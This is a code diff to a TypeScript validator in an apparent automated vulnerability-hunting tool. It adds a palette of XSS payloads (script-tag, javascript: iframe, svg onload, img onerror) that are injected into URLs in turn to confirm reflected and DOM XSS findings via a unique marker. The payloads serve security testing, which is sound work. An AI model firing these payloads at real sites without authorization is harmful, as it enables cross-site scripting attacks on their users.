@@ -143,6 +143,36 @@ export async function validateFindings(
 // ─── Helpers ────────────────────────────────────────────────────────────────
 
 /**
+ * XSS payload palette tried in sequence by the reflected/DOM validators.
+ *
+ * The 2026-04-23 Juice Shop hunt made it concrete: Angular (and any framework
+ * with default HTML sanitization on innerHTML-bound templates) will strip a
+ * plain `<script>alert(...)</script>`, so every single XSS finding came back
+ * "could not be verified" even when the agents had a working exploit. The
+ * fix isn't smarter detection — it's trying multiple *real* bypass shapes
+ * and stopping at the first one that fires the marker.
+ *
+ * `detectionHook` picks the sink the validator listens on: `alert` for
+ * reflected XSS (HeadlessBrowser.validateXSS watches dialogs) and
+ * `console.log` for DOM XSS (HeadlessBrowser.navigateAndAnalyze watches
+ * console).
+ */
+export function buildXssPayloadVariants(
+  marker: string,
+  detectionHook: 'alert' | 'console.log',
+): Array<{ label: string; html: string }> {
+  const trigger = detectionHook === 'alert'
+    ? `alert('${marker}')`
+    : `console.log('${marker}')`;
+  return [
+    { label: 'script-tag', html: `<script>${trigger}</script>` },
+    { label: 'iframe-javascript', html: `<iframe src="javascript:${trigger}"></iframe>` },
+    { label: 'svg-onload', html: `<svg onload="${trigger}">` },
+    { label: 'img-onerror', html: `<img src=x onerror="${trigger}">` },
+  ];
+}
+
+/**
  * Inject a marker payload into a URL by replacing known XSS payload patterns
  * or appending to the last query parameter value.
  */
@@ -182,19 +212,10 @@ registerValidator({
     const evidence: ValidationEvidence[] = [];
     const steps: string[] = [];
 
-    // Generate a unique marker to avoid false positives
+    // Unique marker — false-positive guard (only *our* payload firing counts).
     const marker = `HUNTRESS_XSS_${globalThis.crypto.randomUUID().slice(0, 8)}`;
-
-    // Build the crafted URL with our marker payload
-    // Replace existing XSS payload with our marker-based one
     const targetUrl = finding.target;
-    const markerPayload = `<script>alert('${marker}')</script>`;
-    const craftedUrl = injectMarkerPayload(targetUrl, markerPayload);
 
-    steps.push(`Generated unique marker: ${marker}`);
-    steps.push(`Crafted URL: ${craftedUrl}`);
-
-    // Use Playwright to navigate and detect execution
     const browser = await getSharedBrowser();
     const oobChecker = validatorOobServer
       ? () => validatorOobServer!.getTriggeredCallbacks().some(c =>
@@ -203,21 +224,37 @@ registerValidator({
         )
       : undefined;
 
-    const result = await browser.validateXSS(craftedUrl, marker, oobChecker);
+    steps.push(`Generated unique marker: ${marker}`);
 
-    evidence.push(...result.evidence);
+    // Try each payload variant in sequence. First to fire the marker wins —
+    // dialog/console/OOB evidence from every attempt is aggregated regardless.
+    const variants = buildXssPayloadVariants(marker, 'alert');
+    let confirmed = false;
+    let confidence = 0;
+    let firingVariant: string | null = null;
 
-    // Confidence scoring:
-    // Dialog with exact marker: +50
-    // Console marker: +30
-    // OOB beacon: +40
-    // (these are already scored inside validateXSS)
-    const confidence = Math.min(100, result.confidence);
-    const confirmed = result.confirmed;
+    for (const variant of variants) {
+      const craftedUrl = injectMarkerPayload(targetUrl, variant.html);
+      steps.push(`Trying ${variant.label}: ${variant.html}`);
 
-    steps.push(`Dialog detected with marker: ${result.evidence.some(e => e.description.includes('dialog')) ? 'YES' : 'no'}`);
-    steps.push(`Console marker found: ${result.evidence.some(e => e.description.includes('console')) ? 'YES' : 'no'}`);
-    steps.push(`Confirmed: ${confirmed} (confidence: ${confidence}%)`);
+      const attempt = await browser.validateXSS(craftedUrl, marker, oobChecker);
+      evidence.push(...attempt.evidence);
+      confidence = Math.max(confidence, attempt.confidence);
+
+      if (attempt.confirmed) {
+        confirmed = true;
+        firingVariant = variant.label;
+        steps.push(`✓ CONFIRMED via ${variant.label} payload`);
+        break;
+      }
+    }
+
+    if (!confirmed) {
+      steps.push(`No payload variant fired (${variants.length} attempted) — XSS not confirmed`);
+    }
+
+    confidence = Math.min(100, confidence);
+    steps.push(`Confirmed: ${confirmed} (confidence: ${confidence}%, firing variant: ${firingVariant ?? 'none'})`);
 
     return {
       findingId: finding.id,
@@ -320,26 +357,43 @@ registerValidator({
       steps.push('DANGEROUS: source→sink flow detected');
     }
 
-    // Also try navigating with a hash-based payload to trigger DOM XSS
+    // Navigate with marker payloads and watch the console. Angular-style
+    // hash routing (Juice Shop `#/search?q=...`) needs the payload in the
+    // query-slot of the hash — `injectMarkerPayload` handles that correctly
+    // because its last-`=` search picks the hash-scoped param.
     const marker = `HUNTRESS_DOM_${globalThis.crypto.randomUUID().slice(0, 8)}`;
-    const hashUrl = targetUrl.includes('#')
-      ? targetUrl.replace(/#.*/, `#<img src=x onerror="console.log('${marker}')">`)
-      : `${targetUrl}#<img src=x onerror="console.log('${marker}')">`;
+    const variants = buildXssPayloadVariants(marker, 'console.log');
+    let markerInConsole = false;
+    let firingVariant: string | null = null;
 
-    const navResult = await browser.navigateAndAnalyze(hashUrl);
-    const markerInConsole = navResult.consoleLogs.some(l => l.text.includes(marker));
-    if (markerInConsole) {
-      confidence = Math.min(100, confidence + 30);
-      evidence.push({
-        type: 'script_output',
-        description: 'DOM XSS confirmed: hash-based payload executed',
-        data: `Marker "${marker}" appeared in console after navigating to: ${hashUrl}`,
-        timestamp: Date.now(),
-      });
-      steps.push('Hash-based DOM XSS payload EXECUTED');
+    for (const variant of variants) {
+      const attemptUrl = injectMarkerPayload(targetUrl, variant.html);
+      steps.push(`Trying ${variant.label}: ${variant.html}`);
+      const navResult = await browser.navigateAndAnalyze(attemptUrl);
+
+      if (navResult.consoleLogs.some(l => l.text.includes(marker))) {
+        markerInConsole = true;
+        firingVariant = variant.label;
+        confidence = Math.min(100, confidence + 30);
+        evidence.push({
+          type: 'script_output',
+          description: `DOM XSS confirmed: ${variant.label} payload executed`,
+          data: `Marker "${marker}" appeared in console after navigating to: ${attemptUrl}`,
+          timestamp: Date.now(),
+        });
+        steps.push(`✓ DOM XSS EXECUTED via ${variant.label}`);
+        break;
+      }
+    }
+
+    if (!markerInConsole) {
+      steps.push(`No payload variant fired the marker (${variants.length} attempted)`);
     }
 
     const confirmed = confidence >= 60 && (analysis.hasDangerousFlow || markerInConsole);
+    if (confirmed && firingVariant) {
+      steps.push(`Firing variant: ${firingVariant}`);
+    }
 
     steps.push(`Confirmed: ${confirmed} (confidence: ${confidence}%)`);
 
